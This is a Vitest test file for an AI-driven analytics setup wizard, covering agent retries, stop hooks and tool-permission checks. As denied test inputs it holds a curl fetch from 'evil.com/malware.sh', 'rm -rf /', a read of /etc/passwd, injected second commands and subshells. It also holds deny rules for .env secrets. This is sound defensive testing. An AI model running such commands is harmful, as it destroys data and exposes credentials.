import {
  vi,
  describe,
  it,
  expect,
  beforeEach,
  afterEach,
  type Mock,
} from 'vitest';
import {
  runAgent,
  createStopHook,
  createPreCompactHook,
  createPreToolUseHook,
  wizardCanUseTool,
  buildWizardMetadata,
  isSkillInstallCommand,
  matchesAllowedPrefix,
  parseEventPlanContent,
  MAX_BASH_SLEEP_SECONDS,
  AgentErrorType,
} from '../agent-interface';
import type { WizardOptions } from '../../utils/types';
import type { SpinnerHandle } from '../../ui';
import {
  AdditionalFeature,
  ADDITIONAL_FEATURE_PROMPTS,
} from '../wizard-session';

// Mock dependencies
vi.mock('../../utils/analytics');
vi.mock('../../utils/debug');

// Mock the SDK module
const mockQuery = vi.fn();
vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
  query: (...args: unknown[]) => mockQuery(...args),
}));

// Mock the UI layer
const mockUIInstance = {
  log: {
    step: vi.fn(),
    success: vi.fn(),
    error: vi.fn(),
    warn: vi.fn(),
    info: vi.fn(),
  },
  spinner: vi.fn(),
  select: vi.fn(),
  confirm: vi.fn(),
  text: vi.fn(),
  intro: vi.fn(),
  outro: vi.fn(),
  cancel: vi.fn(),
  note: vi.fn(),
  isCancel: vi.fn(),
  setDetectedFramework: vi.fn(),
  setCredentials: vi.fn(),
  pushStatus: vi.fn(),
  setLoginUrl: vi.fn(),
  showServiceStatus: vi.fn(),
  showSettingsOverride: vi.fn(),
  startRun: vi.fn(),
  syncTodos: vi.fn(),
  groupMultiselect: vi.fn(),
  multiselect: vi.fn(),
  heartbeat: vi.fn(),
  setEventPlan: vi.fn(),
  setRetryState: vi.fn(),
};
vi.mock('../../ui', () => ({
  getUI: () => mockUIInstance,
}));

describe('runAgent', () => {
  let mockSpinner: {
    start: Mock;
    stop: Mock;
    message: Mock;
  };

  const defaultOptions: WizardOptions = {
    debug: false,
    installDir: '/test/dir',
    forceInstall: false,
    default: false,
    signup: false,
    localMcp: false,
    ci: false,
    menu: false,
    benchmark: false,
  };

  const defaultAgentConfig = {
    workingDirectory: '/test/dir',
    mcpServers: {},
    model: 'claude-opus-4-5-20251101',
  };

  beforeEach(() => {
    vi.clearAllMocks();

    mockSpinner = {
      start: vi.fn(),
      stop: vi.fn(),
      message: vi.fn(),
    };

    mockUIInstance.spinner.mockReturnValue(mockSpinner);
    // Reset log mocks
    Object.values(mockUIInstance.log).forEach((fn) => fn.mockReset());
  });

  describe('race condition handling', () => {
    it('should return success when agent completes successfully then SDK cleanup fails', async () => {
      // This simulates the race condition:
      // 1. Agent completes with success result
      // 2. signalDone() is called, completing the prompt generator
      // 3. SDK tries to send cleanup command while streaming is active
      // 4. SDK throws an error
      // The fix should recognize we already got a success and return success anyway

      function* mockGeneratorWithCleanupError() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'Agent completed successfully',
        };

        // Simulate the SDK cleanup error that occurs after success
        throw new Error('only prompt commands are supported in streaming mode');
      }

      mockQuery.mockReturnValue(mockGeneratorWithCleanupError());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return success (empty object), not throw
      expect(result).toEqual({});
      expect(mockSpinner.stop).toHaveBeenCalledWith('Test success');
    });

    it('should still throw when no success result was received before error', async () => {
      // If we never got a success result, errors should propagate normally

      function* mockGeneratorWithOnlyError() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        // No success result, just an error
        throw new Error('Actual SDK error');
      }

      mockQuery.mockReturnValue(mockGeneratorWithOnlyError());

      await expect(
        runAgent(
          defaultAgentConfig,
          'test prompt',
          defaultOptions,
          mockSpinner as unknown as SpinnerHandle,
          {
            successMessage: 'Test success',
            errorMessage: 'Test error',
          },
        ),
      ).rejects.toThrow('Actual SDK error');

      expect(mockSpinner.stop).toHaveBeenCalledWith('Test error');
    });

    it('should not treat error results as success', async () => {
      // A result with is_error: true should not count as success
      // Even if subtype is 'success', the is_error flag takes precedence

      function* mockGeneratorWithErrorResult() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        yield {
          type: 'result',
          subtype: 'success', // subtype can be success but is_error true
          is_error: true,
          result: 'API Error: 500 Internal Server Error',
        };

        throw new Error('Process exited with code 1');
      }

      mockQuery.mockReturnValue(mockGeneratorWithErrorResult());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return API error, not success
      expect(result.error).toBe('WIZARD_API_ERROR');
      expect(result.message).toContain('API Error');
    });

    // Backwards-compat: 31 bundled skills under skills/integration/**
    // still emit [STATUS] / [ERROR-MCP-MISSING] / [ERROR-RESOURCE-MISSING]
    // text markers per their workflow files. #172 migrated to a structured
    // `report_status` MCP tool but didn't update the skills, silently
    // dropping signals from skill-driven flows. The legacy text-marker
    // scanner is now restored as a fallback alongside report_status.
    it('reports MCP_MISSING when agent emits the [ERROR-MCP-MISSING] legacy marker', async () => {
      function* mcpMissingGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: '[ERROR-MCP-MISSING] Could not load skill menu — MCP not available',
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }
      mockQuery.mockReturnValue(mcpMissingGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.MCP_MISSING);
    });

    it('reports RESOURCE_MISSING when agent emits the [ERROR-RESOURCE-MISSING] legacy marker', async () => {
      function* resourceMissingGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: '[ERROR-RESOURCE-MISSING] Could not find a suitable skill for this project.',
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }
      mockQuery.mockReturnValue(resourceMissingGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.RESOURCE_MISSING);
    });

    it('forwards [STATUS] legacy markers to the spinner', async () => {
      function* statusMarkerGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: '[STATUS] Checking project structure',
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }
      mockQuery.mockReturnValue(statusMarkerGenerator());

      await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(mockSpinner.message).toHaveBeenCalledWith(
        'Checking project structure',
      );
    });

    it('forwards multiple [STATUS] markers in a single text block', async () => {
      function* multiStatusGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: 'Doing some work.\n[STATUS] Verifying dependencies\nMore work.\n[STATUS] Generating events',
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }
      mockQuery.mockReturnValue(multiStatusGenerator());

      await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(mockSpinner.message).toHaveBeenCalledWith(
        'Verifying dependencies',
      );
      expect(mockSpinner.message).toHaveBeenCalledWith('Generating events');
    });

    it('should report RATE_LIMIT when agent output contains API Error 429', async () => {
      function* rateLimitGenerator() {
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'API Error: 429 Too Many Requests',
        };
      }

      mockQuery.mockReturnValue(rateLimitGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.RATE_LIMIT);
      expect(result.message).toContain('API Error: 429');
    });

    it('should report API_ERROR when agent output contains a non-429 API Error', async () => {
      function* apiErrorGenerator() {
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'API Error: 500 Internal Server Error',
        };
      }

      mockQuery.mockReturnValue(apiErrorGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.API_ERROR);
      expect(result.message).toContain('API Error: 500');
    });

    it('should report AUTH_ERROR when result contains authentication_failed', async () => {
      function* authFailedGenerator() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [{ name: 'amplitude-wizard', status: 'connected' }],
        };
        yield {
          type: 'result',
          subtype: 'error',
          is_error: true,
          result: '',
          error: 'authentication_failed',
        };
      }

      mockQuery.mockReturnValue(authFailedGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.AUTH_ERROR);
      expect(mockSpinner.stop).toHaveBeenCalledWith('Authentication failed');
    });

    it('should report AUTH_ERROR when amplitude-wizard MCP has needs-auth status', async () => {
      function* needsAuthGenerator() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [{ name: 'amplitude-wizard', status: 'needs-auth' }],
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'Done',
        };
      }

      mockQuery.mockReturnValue(needsAuthGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.AUTH_ERROR);
    });
  });

  describe('stall retry', () => {
    afterEach(() => {
      vi.useRealTimers();
    });

    it('retries after a stall and succeeds on the second attempt', async () => {
      vi.useFakeTimers();

      let queryCallCount = 0;

      mockQuery.mockImplementation(
        (params: { options: Record<string, unknown> }) => {
          queryCallCount++;
          const signal = params.options.abortSignal as AbortSignal;

          if (queryCallCount === 1) {
            // Hang until aborted — no yield because the await always rejects first
            // eslint-disable-next-line require-yield
            return (async function* () {
              await new Promise<never>((_, reject) => {
                signal.addEventListener('abort', () =>
                  reject(new Error('Stall aborted')),
                );
              });
            })();
          }

          // Second attempt: succeed immediately
          return (async function* () {
            yield {
              type: 'result',
              subtype: 'success',
              is_error: false,
              result: '',
            };
          })();
        },
      );

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Trigger the initial stall timeout (60s cold-start grace period) + backoff (2s)
      await vi.advanceTimersByTimeAsync(63_000);

      const result = await runPromise;

      expect(result).toEqual({});
      expect(queryCallCount).toBe(2);
      expect(mockSpinner.stop).toHaveBeenCalledWith('Done');
    });

    it('throws after exhausting all retries', async () => {
      vi.useFakeTimers();

      let queryCallCount = 0;

      mockQuery.mockImplementation(
        (params: { options: Record<string, unknown> }) => {
          queryCallCount++;
          const signal = params.options.abortSignal as AbortSignal;
          // eslint-disable-next-line require-yield
          return (async function* () {
            await new Promise<never>((_, reject) => {
              signal.addEventListener('abort', () =>
                reject(new Error('Stall aborted')),
              );
            });
          })();
        },
      );

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Attach the rejection check BEFORE advancing timers so the promise has a
      // .catch() handler and doesn't become an unhandled rejection mid-advance.
      const rejectCheck = expect(runPromise).rejects.toThrow('Stall aborted');

      // Fires all 6 stall timers (1 × 60s cold-start + 5 × 120s mid-run) plus
      // jittered backoff delays (worst case ~2.5s + 5s + 10s + 20s + 37.5s ≈ 75s).
      // advanceTimersByTimeAsync processes microtasks between each timer firing,
      // so each retry's new timer gets registered before the next fires.
      // Generous budget of 1500s covers all timers + backoffs comfortably.
      await vi.advanceTimersByTimeAsync(1_500_000);

      await rejectCheck;
      expect(queryCallCount).toBe(6); // MAX_RETRIES=5 → 6 total attempts
    });

    it('classifies all-attempts-failed-with-400-terminated as GATEWAY_DOWN', async () => {
      // Regression test for the production incident where every retry
      // attempt died with the same upstream-gateway signature. The
      // wizard previously surfaced a generic API_ERROR with no path
      // forward; now we surface GATEWAY_DOWN so the runner can show the
      // ANTHROPIC_API_KEY workaround.
      vi.useFakeTimers();

      let queryCallCount = 0;
      mockQuery.mockImplementation(() => {
        queryCallCount++;
        return (async function* () {
          // Each attempt yields a result message with is_error=true and the
          // characteristic "API Error: 400 terminated" payload. This
          // exercises the post-stream transient-error branch (not the
          // catch path) so we cover the most common production shape.
          yield {
            type: 'result',
            subtype: 'success',
            is_error: true,
            result: 'API Error: 400 terminated',
          };
        })();
      });

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Advance past all backoff windows (max ~75s worst-case + buffer)
      await vi.advanceTimersByTimeAsync(200_000);

      const result = await runPromise;

      // All 6 attempts hit 400 terminated → GATEWAY_DOWN
      expect(queryCallCount).toBe(6);
      expect(result.error).toBe(AgentErrorType.GATEWAY_DOWN);
      expect(result.message).toContain('400 terminated');
    });

    it('does not classify mixed errors as GATEWAY_DOWN', async () => {
      // If even one attempt fails for a different reason (e.g. stall),
      // we should NOT surface GATEWAY_DOWN — that's reserved for the
      // unambiguous "every attempt died upstream" pattern.
      vi.useFakeTimers();

      let queryCallCount = 0;
      mockQuery.mockImplementation(
        (params: { options: Record<string, unknown> }) => {
          queryCallCount++;
          if (queryCallCount === 1) {
            // First attempt: stall (different cause)
            const signal = params.options.abortSignal as AbortSignal;
            // eslint-disable-next-line require-yield
            return (async function* () {
              await new Promise<never>((_, reject) => {
                signal.addEventListener('abort', () =>
                  reject(new Error('Stall aborted')),
                );
              });
            })();
          }
          // Subsequent attempts: 400 terminated
          return (async function* () {
            yield {
              type: 'result',
              subtype: 'success',
              is_error: true,
              result: 'API Error: 400 terminated',
            };
          })();
        },
      );

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      await vi.advanceTimersByTimeAsync(1_500_000);

      const result = await runPromise;

      // Should be API_ERROR (or RATE_LIMIT etc.), not GATEWAY_DOWN —
      // because not every attempt was a 400.
      expect(result.error).not.toBe(AgentErrorType.GATEWAY_DOWN);
    });

    it('does not retry on non-stall errors', async () => {
      let queryCallCount = 0;

      mockQuery.mockImplementation(() => {
        queryCallCount++;
        // eslint-disable-next-line require-yield
        return (async function* () {
          throw new Error('Network failure');
        })();
      });

      await expect(
        runAgent(
          defaultAgentConfig,
          'test prompt',
          defaultOptions,
          mockSpinner as unknown as SpinnerHandle,
        ),
      ).rejects.toThrow('Network failure');

      expect(queryCallCount).toBe(1); // No retry — not a stall
    });

    it('clears the retry banner on the first message of the recovery attempt', async () => {
      // Regression: before, the banner was only cleared when the recovery
      // attempt's stream reached a clean completion. A recovery run can take
      // many minutes, so users saw the amber "retrying" banner stick around
      // even though the wizard was working. The fix clears on the first
      // message of the new attempt (mirroring middleware/retry.ts).
      vi.useFakeTimers();

      let queryCallCount = 0;
      let attempt2FirstMessageSeen = false;
      let setRetryStateCallsAtFirstMessage: Array<unknown> | null = null;

      mockQuery.mockImplementation(() => {
        queryCallCount++;

        if (queryCallCount === 1) {
          // Attempt 1: yield an error result with API Error 400. The outer
          // retry loop detects this in collectedText and publishes a banner.
          return (async function* () {
            yield {
              type: 'result',
              subtype: 'success',
              is_error: true,
              result: 'API Error: 400 terminated',
            };
          })();
        }

        // Attempt 2: yield an assistant message first (simulating forward
        // progress), then success. The banner must clear on the assistant
        // message, not wait for the success result.
        return (async function* () {
          yield {
            type: 'assistant',
            message: {
              role: 'assistant',
              content: [{ type: 'text', text: 'Resuming work' }],
            },
          };
          // Snapshot setRetryState calls at the moment of first progress.
          attempt2FirstMessageSeen = true;
          setRetryStateCallsAtFirstMessage =
            mockUIInstance.setRetryState.mock.calls.map((call) => call[0]);
          yield {
            type: 'result',
            subtype: 'success',
            is_error: false,
            result: '',
          };
        })();
      });

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Let attempt 1 emit, then advance past the 2s backoff so attempt 2 starts.
      await vi.advanceTimersByTimeAsync(3_000);
      const result = await runPromise;

      expect(result).toEqual({});
      expect(queryCallCount).toBe(2);
      expect(attempt2FirstMessageSeen).toBe(true);

      // The snapshot at the moment of first progress must already contain a
      // non-null publish AND a null clear — i.e. the banner was cleared before
      // the stream reached its success result.
      expect(setRetryStateCallsAtFirstMessage).not.toBeNull();
      const calls = setRetryStateCallsAtFirstMessage!;
      const firstPublishIndex = calls.findIndex((arg) => arg !== null);
      const firstClearIndex = calls.findIndex(
        (arg, idx) => idx > firstPublishIndex && arg === null,
      );
      expect(firstPublishIndex).toBeGreaterThanOrEqual(0);
      expect(firstClearIndex).toBeGreaterThan(firstPublishIndex);
    });
  });

  describe('race condition handling', () => {
    it('should return success when agent completes successfully then SDK cleanup fails', async () => {
      // This test models actual SDK behavior where the SDK emits TWO result messages:
      // 1. SDK yields success result (num_turns: 105, is_error: false)
      // 2. SDK yields a SECOND result with is_error: true containing
      //    accumulated cleanup/telemetry errors
      // 3. The errors should be logged to file but NOT shown to the user
      //
      // This differs from the thrown exception test above - here the SDK YIELDS
      // an error result message instead of THROWING an exception.

      function* mockGeneratorWithYieldedErrorAfterSuccess() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        // First result: success (this is the real completion)
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          num_turns: 105,
          result: '[WIZARD-REMARK] Integration completed successfully',
          session_id: '2ce14bda-6d86-4220-b5bb-ab24f7004290',
          total_cost_usd: 5.83,
        };

        // Second result: error (SDK cleanup noise - yielded, not thrown)
        yield {
          type: 'result',
          subtype: 'error_during_execution',
          is_error: true,
          num_turns: 0,
          session_id: '2ce14bda-6d86-4220-b5bb-ab24f7004290',
          total_cost_usd: 0,
          errors: [
            'only prompt commands are supported in streaming mode',
            'Error: 1P event logging: 14 events failed to export',
            'Error: 1P event logging: 13 events failed to export',
            'Error: Failed to export 14 events',
          ],
        };
      }

      mockQuery.mockReturnValue(mockGeneratorWithYieldedErrorAfterSuccess());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return success (empty object), not error
      expect(result).toEqual({});
      expect(mockSpinner.stop).toHaveBeenCalledWith('Test success');

      // ui.log.error should NOT have been called (errors suppressed for user)
      expect(mockUIInstance.log.error).not.toHaveBeenCalled();
    });
  });
});

describe('createStopHook', () => {
  const hookInput = { stop_hook_active: false };

  it('empty queue: first call blocks for remark, second allows stop', async () => {
    const hook = createStopHook(() => []);

    // First call → remark prompt
    const first = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Second call → allow stop
    const second = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(second).toEqual({});
  });

  it('single feature: feature prompt, then remark, then allow stop', async () => {
    const hook = createStopHook(() => [AdditionalFeature.LLM]);

    // First call → LLM feature prompt
    const first = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Second call → remark prompt
    const second = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(second).toHaveProperty('decision', 'block');
    expect((second as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Third call → allow stop
    const third = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(third).toEqual({});
  });

  it('multiple queue entries: drains all, then remark, then allow stop', async () => {
    // Queue the same feature twice to exercise multi-item draining
    const hook = createStopHook(() => [
      AdditionalFeature.LLM,
      AdditionalFeature.LLM,
    ]);
    const signal = new AbortController().signal;

    // First call → LLM prompt
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Second call → LLM prompt again
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toHaveProperty('decision', 'block');
    expect((second as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Third call → remark prompt
    const third = await hook(hookInput, undefined, { signal });
    expect(third).toHaveProperty('decision', 'block');
    expect((third as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Fourth call → allow stop
    const fourth = await hook(hookInput, undefined, { signal });
    expect(fourth).toEqual({});
  });

  it('allow stop is idempotent after all phases complete', async () => {
    const hook = createStopHook(() => []);
    const signal = new AbortController().signal;

    await hook(hookInput, undefined, { signal }); // remark
    await hook(hookInput, undefined, { signal }); // allow
    const extra = await hook(hookInput, undefined, { signal }); // still allow
    expect(extra).toEqual({});
  });

  it('auth error: allows stop immediately, skipping queue and remark', async () => {
    let authError = false;
    const hook = createStopHook(
      () => [AdditionalFeature.LLM],
      () => authError,
    );
    const signal = new AbortController().signal;

    authError = true;
    const result = await hook(hookInput, undefined, { signal });
    expect(result).toEqual({});
  });

  it('auth error detected mid-run: skips remaining phases on next call', async () => {
    let authError = false;
    const hook = createStopHook(
      () => [AdditionalFeature.LLM],
      () => authError,
    );
    const signal = new AbortController().signal;

    // First call drains queue normally
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');

    // Auth error occurs before second call
    authError = true;
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toEqual({});
  });

  it('late opt-in: trailing feature added after hook created is still picked up', async () => {
    // Simulates user opting in mid-run via the picklist
    let queue: AdditionalFeature[] = [];
    const hook = createStopHook(() => queue);
    const signal = new AbortController().signal;

    // User opts in mid-run — queue grows after hook was created
    queue = [AdditionalFeature.LLM];

    // First call → LLM feature prompt (not remark, because queue is now non-empty)
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );
  });

  it('inline features (Session Replay) are skipped by the stop hook', async () => {
    // Inline features are configured during SDK init via the system prompt,
    // not drained here. The hook should treat a queue with only inline
    // entries as empty.
    const hook = createStopHook(() => [AdditionalFeature.SessionReplay]);
    const signal = new AbortController().signal;

    // First call → remark prompt (no trailing features to drain)
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Second call → allow stop
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toEqual({});
  });

  it('mixed queue: drains trailing only, skips inline features', async () => {
    const hook = createStopHook(() => [
      AdditionalFeature.SessionReplay,
      AdditionalFeature.LLM,
    ]);
    const signal = new AbortController().signal;

    // First call → LLM feature prompt (SR is filtered out)
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Second call → remark prompt
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toHaveProperty('decision', 'block');
    expect((second as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Third call → allow stop
    const third = await hook(hookInput, undefined, { signal });
    expect(third).toEqual({});
  });
});

describe('isSkillInstallCommand', () => {
  it('allows a valid GitHub releases skill install', () => {
    const cmd =
      "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1.0.0/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
    expect(isSkillInstallCommand(cmd)).toBe(true);
  });

  it('allows a localhost dev skill install', () => {
    const cmd =
      "mkdir -p .claude/skills/test && curl -sL 'http://localhost:3000/skill.tar.gz' | tar -xz -C .claude/skills/test";
    expect(isSkillInstallCommand(cmd)).toBe(true);
  });

  it('rejects a command that does not start with mkdir -p .claude/skills/', () => {
    const cmd =
      "curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz'";
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });

  it('rejects a curl from an untrusted domain', () => {
    const cmd =
      "mkdir -p .claude/skills/evil && curl -sL 'https://evil.com/malware.sh'";
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });

  it('rejects a command with no curl at all', () => {
    const cmd = 'mkdir -p .claude/skills/foo && echo done';
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });
});

describe('matchesAllowedPrefix', () => {
  it('allows npm install', () => {
    expect(matchesAllowedPrefix('npm install')).toBe(true);
  });

  it('allows yarn add react', () => {
    expect(matchesAllowedPrefix('yarn add react')).toBe(true);
  });

  it('allows pnpm run build', () => {
    expect(matchesAllowedPrefix('pnpm run build')).toBe(true);
  });

  it('allows npm exec tsc', () => {
    expect(matchesAllowedPrefix('npm exec tsc')).toBe(true);
  });

  it('allows standalone build commands (hugo, make)', () => {
    expect(matchesAllowedPrefix('hugo')).toBe(true);
    expect(matchesAllowedPrefix('make')).toBe(true);
  });

  it('denies unknown executables', () => {
    expect(matchesAllowedPrefix('rm -rf /')).toBe(false);
    expect(matchesAllowedPrefix('curl https://example.com')).toBe(false);
  });

  it('denies disallowed sub-commands even from known executables', () => {
    expect(matchesAllowedPrefix('npm run dev')).toBe(false);
    expect(matchesAllowedPrefix('npm run start')).toBe(false);
    expect(matchesAllowedPrefix('npm run deploy')).toBe(false);
  });

  it('allows npm publish because "pub" is in SAFE_SCRIPTS (startsWith match for go pub)', () => {
    // This is an intentional side-effect of the "pub" entry covering Go's pub sub-command.
    expect(matchesAllowedPrefix('npm publish')).toBe(true);
  });

  it('allows linting tools as sub-commands', () => {
    expect(matchesAllowedPrefix('npm run eslint')).toBe(true);
    expect(matchesAllowedPrefix('npx prettier --check .')).toBe(true);
  });
});

describe('wizardCanUseTool', () => {
  describe('file operations on .env files', () => {
    it('denies Read on .env', () => {
      const result = wizardCanUseTool('Read', { file_path: '/project/.env' });
      expect(result.behavior).toBe('deny');
    });

    it('denies Write on .env.local', () => {
      const result = wizardCanUseTool('Write', {
        file_path: '/project/.env.local',
      });
      expect(result.behavior).toBe('deny');
    });

    it('denies Edit on .env.production', () => {
      const result = wizardCanUseTool('Edit', {
        file_path: '/project/.env.production',
      });
      expect(result.behavior).toBe('deny');
    });

    it('allows Read on a regular file', () => {
      const result = wizardCanUseTool('Read', {
        file_path: '/project/src/index.ts',
      });
      expect(result.behavior).toBe('allow');
    });

    it('allows Write on a non-env file', () => {
      const result = wizardCanUseTool('Write', {
        file_path: '/project/src/analytics.ts',
      });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('Grep', () => {
    it('denies Grep directly targeting a .env file', () => {
      const result = wizardCanUseTool('Grep', { path: '/project/.env' });
      expect(result.behavior).toBe('deny');
    });

    it('allows Grep on a directory (ripgrep skips dotfiles by default)', () => {
      const result = wizardCanUseTool('Grep', { path: '/project/src' });
      expect(result.behavior).toBe('allow');
    });

    it('allows Grep with no path', () => {
      const result = wizardCanUseTool('Grep', { pattern: 'amplitude' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('non-Bash tools', () => {
    it('allows Glob unconditionally', () => {
      expect(wizardCanUseTool('Glob', { pattern: '**/*.ts' }).behavior).toBe(
        'allow',
      );
    });

    it('allows ListMcpResourcesTool unconditionally', () => {
      expect(wizardCanUseTool('ListMcpResourcesTool', {}).behavior).toBe(
        'allow',
      );
    });
  });

  describe('Bash — dangerous operators', () => {
    it('denies semicolon', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm install; rm -rf /' }).behavior,
      ).toBe('deny');
    });

    it('denies backtick', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'echo `cat /etc/passwd`' })
          .behavior,
      ).toBe('deny');
    });

    it('denies dollar-paren subshell', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'echo $(whoami)' }).behavior,
      ).toBe('deny');
    });
  });

  describe('Bash — skill installation', () => {
    it('allows Amplitude skill install from GitHub releases', () => {
      const cmd =
        "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
    });
  });

  describe('Bash — pipe to tail/head', () => {
    it('allows npm install piped to tail', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | tail -n 20',
      });
      expect(result.behavior).toBe('allow');
    });

    it('allows stderr redirect then pipe to head', () => {
